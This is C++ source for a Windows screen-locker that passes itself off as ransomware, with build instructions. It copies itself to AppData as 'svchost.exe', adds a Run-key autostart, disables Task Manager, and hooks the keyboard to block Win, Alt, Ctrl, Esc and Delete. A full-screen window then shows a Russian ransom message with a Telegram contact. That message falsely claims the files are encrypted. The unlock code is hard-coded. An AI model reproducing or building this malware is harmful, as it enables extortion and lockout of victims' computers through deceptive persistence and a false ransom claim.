// language: C++, file: locker.cpp, target: Windows 10/11 x64, MSVC 2022
// Build: cl /utf-8 /std:c++17 /EHsc /O2 /MT locker.cpp user32.lib gdi32.lib advapi32.lib shell32.lib bcrypt.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <cmath>
#include <thread>

#pragma execution_character_set("utf-8")

static const std::wstring kPassword = L"1337";

static HHOOK   g_kbHook    = nullptr;
static HWND    g_hwnd      = nullptr;
static bool    g_locked    = true;
static std::wstring g_input;
static bool    g_blink     = false;
static int     g_glitch_offset = 0;
static int     g_scanline_y = 0;
static POINT   g_mouse_pos = {0, 0};

static void InstallPersistence() {
    wchar_t self[MAX_PATH]{};
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    wchar_t appdata[MAX_PATH]{};
    GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH);
    std::wstring dst = std::wstring(appdata) + L"\\svchost.exe";
    CopyFileW(self, dst.c_str(), FALSE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"SysUpdate", 0, REG_SZ, (const BYTE*)dst.c_str(), (DWORD)((dst.size()+1)*sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        DWORD v = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hKey);
    }
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && g_locked) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_TAB ||
                p->vkCode == VK_ESCAPE || p->vkCode == VK_F4 || p->vkCode == VK_MENU ||
                p->vkCode == VK_CONTROL || p->vkCode == VK_DELETE) {
                return 1;
            }
        }
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

static void Unlock() {
    g_locked = false;
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD v = 0;
        RegSetValueExW(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&v, sizeof(v));
        RegCloseKey(hk);
    }
    UnhookWindowsHookEx(g_kbHook);
    DestroyWindow(g_hwnd);
    PostQuitMessage(0);
}

// Рисуем градиентный фон
static void DrawBackground(HDC dc, int w, int h) {
    TRIVERTEX vert[2];
    GRADIENT_RECT gRect;
    vert[0].x = 0; vert[0].y = 0;
    vert[0].Red = 0x5000; vert[0].Green = 0; vert[0].Blue = 0; vert[0].Alpha = 0;
    vert[1].x = w; vert[1].y = h;
    vert[1].Red = 0x1000; vert[1].Green = 0; vert[1].Blue = 0; vert[1].Alpha = 0;
    gRect.UpperLeft = 0; gRect.LowerRight = 1;
    GradientFill(dc, vert, 2, &gRect, 1, GRADIENT_FILL_RECT_V);
}

// Рисуем следящий глаз
static void DrawEye(HDC dc, int cx, int cy, POINT mouse) {
    int ew = 300, eh = 160;
    int left = cx - ew / 2, right = cx + ew / 2;
    int top = cy - eh / 2, bottom = cy + eh / 2;

    // Белок глаза
    HBRUSH hWhite = CreateSolidBrush(RGB(240, 240, 240));
    SelectObject(dc, hWhite);
    Ellipse(dc, left, top, right, bottom);
    DeleteObject(hWhite);

    // Радужка (следит за мышью)
    int dx = mouse.x - cx;
    int dy = mouse.y - cy;
    float dist = sqrt((float)(dx*dx + dy*dy));
    float max_dist = ew / 2 - 40;
    if (dist > max_dist) {
        dx = (int)(dx / dist * max_dist);
        dy = (int)(dy / dist * max_dist);
    }

    int iris_x = cx + dx;
    int iris_y = cy + dy;
    int iris_r = 50;

    HBRUSH hIris = CreateSolidBrush(RGB(150, 0, 0));
    SelectObject(dc, hIris);
    Ellipse(dc, iris_x - iris_r, iris_y - iris_r, iris_x + iris_r, iris_y + iris_r);
    DeleteObject(hIris);

    // Зрачок
    HBRUSH hPupil = CreateSolidBrush(RGB(0, 0, 0));
    SelectObject(dc, hPupil);
    int pupil_r = 25;
    Ellipse(dc, iris_x - pupil_r, iris_y - pupil_r, iris_x + pupil_r, iris_y + pupil_r);
    DeleteObject(hPupil);

    // Блик
    HBRUSH hGlint = CreateSolidBrush(RGB(255, 255, 255));
    SelectObject(dc, hGlint);
    Ellipse(dc, iris_x - 15, iris_y - 20, iris_x - 5, iris_y - 10);
    DeleteObject(hGlint);

    // Контур глаза
    HPEN hPen = CreatePen(PS_SOLID, 4, RGB(255, 255, 255));
    SelectObject(dc, hPen);
    SelectObject(dc, GetStockObject(NULL_BRUSH));
    Ellipse(dc, left, top, right, bottom);
    DeleteObject(hPen);
}

static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
    case WM_CREATE: {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        
        SetWindowPos(h, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW);
        ShowCursor(TRUE); 
        g_hwnd = h;
        SetForegroundWindow(h);
        SetFocus(h);

        SetTimer(h, 1, 30, nullptr); // Глитч и помехи
        SetTimer(h, 2, 500, nullptr); // Курсор
        SetTimer(h, 3, 10, nullptr);  // Слежение за мышью
        return 0;
    }
    case WM_MOUSEMOVE: {
        g_mouse_pos.x = GET_X_LPARAM(l);
        g_mouse_pos.y = GET_Y_LPARAM(l);
        return 0;
    }
    case WM_TIMER: {
        if (w == 1) {
            g_glitch_offset = (rand() % 5) - 2; // Случайный сдвиг текста
            g_scanline_y += 15;
            if (g_scanline_y > GetSystemMetrics(SM_CYSCREEN)) g_scanline_y = 0;
            InvalidateRect(h, nullptr, FALSE);
        } else if (w == 2) {
            g_blink = !g_blink;
            InvalidateRect(h, nullptr, FALSE);
        } else if (w == 3) {
            POINT p;
            GetCursorPos(&p);
            g_mouse_pos = p;
            InvalidateRect(h, nullptr, FALSE);
        }
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        int cx = rc.right;
        int cy = rc.bottom;

        // 1. Градиентный фон
        DrawBackground(dc, cx, cy);

        // 2. Эффект помех (тонкая линия)
        HPEN hScan = CreatePen(PS_SOLID, 2, RGB(255, 0, 0));
        SelectObject(dc, hScan);
        MoveToEx(dc, 0, g_scanline_y, NULL);
        LineTo(dc, cx, g_scanline_y);
        DeleteObject(hScan);

        // 3. Глаз
        DrawEye(dc, cx / 2, cy / 3, g_mouse_pos);

        // 4. Текст (с глитч-эффектом)
        SetBkMode(dc, TRANSPARENT);
        HFONT fTitle = CreateFontW(72, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Impact");
        SelectObject(dc, fTitle);

        // Тень/обводка
        SetTextColor(dc, RGB(0, 0, 0));
        RECT rcTitle = {g_glitch_offset, cy / 2 + 30 + g_glitch_offset, cx, cy / 2 + 100};
        DrawTextW(dc, L"ВАС ЗАМЕТИЛИ", -1, &rcTitle, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        
        // Основной текст
        SetTextColor(dc, RGB(255, 255, 255));
        RECT rcTitleMain = {-g_glitch_offset, cy / 2 + 30 - g_glitch_offset, cx, cy / 2 + 100};
        DrawTextW(dc, L"ВАС ЗАМЕТИЛИ", -1, &rcTitleMain, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        // 5. Блок с требованием
        int boxW = 700, boxH = 200;
        int boxX = (cx - boxW) / 2;
        int boxY = cy - 300;
        RECT rcBox = {boxX, boxY, boxX + boxW, boxY + boxH};
        
        HBRUSH hBoxBg = CreateSolidBrush(RGB(20, 0, 0));
        FillRect(dc, &rcBox, hBoxBg);
        DeleteObject(hBoxBg);
        
        FrameRect(dc, &rcBox, (HBRUSH)GetStockObject(WHITE_BRUSH));

        HFONT fText = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fText);
        SetTextColor(dc, RGB(255, 255, 255));
        
        RECT rcText = rcBox; rcText.left += 20; rcText.top += 20;
        DrawTextW(dc, L"Ваши файлы зашифрованы.\nДля получения кода напишите в Telegram: @UserTGB", -1, &rcText, DT_LEFT | DT_TOP);

        // Поле ввода
        RECT rcInput = {boxX + 50, boxY + 120, boxX + boxW - 50, boxY + 160};
        HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(dc, &rcInput, white);
        DeleteObject(white);
        
        SetTextColor(dc, RGB(0, 0, 0));
        RECT rcInputText = rcInput; rcInputText.left += 10;
        DrawTextW(dc, g_input.c_str(), -1, &rcInputText, DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        // Курсор
        if (g_blink) {
            SIZE sz;
            GetTextExtentPoint32W(dc, g_input.c_str(), g_input.length(), &sz);
            RECT rcCursor = {rcInputText.left + sz.cx, rcInputText.top + 5, rcInputText.left + sz.cx + 4, rcInputText.bottom - 5};
            HBRUSH curBrush = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(dc, &rcCursor, curBrush);
            DeleteObject(curBrush);
        }

        // Подсказка Enter
        SetTextColor(dc, RGB(150, 150, 150));
        RECT rcEnter = rcBox; rcEnter.top = rcBox.bottom + 10;
        DrawTextW(dc, L"[ Enter для подтверждения ]", -1, &rcEnter, DT_CENTER | DT_TOP);

        DeleteObject(fTitle);
        DeleteObject(fText);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_CHAR: {
        if (w == VK_BACK && !g_input.empty()) {
            g_input.pop_back();
        } else if (w >= 32 && w < 127 && g_input.length() < 15) {
            g_input.push_back((wchar_t)w);
        }
        InvalidateRect(h, nullptr, TRUE);
        return 0;
    }
    case WM_KEYDOWN: {
        if (w == VK_RETURN) {
            if (g_input == kPassword) {
                Unlock();
            } else {
                g_input.clear();
                InvalidateRect(h, nullptr, TRUE);
            }
        }
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, msg, w, l);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    InstallPersistence();
    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"LockerWnd";
    RegisterClassW(&wc);

    CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"LockerWnd", L"System", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInst, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    return 0;
}
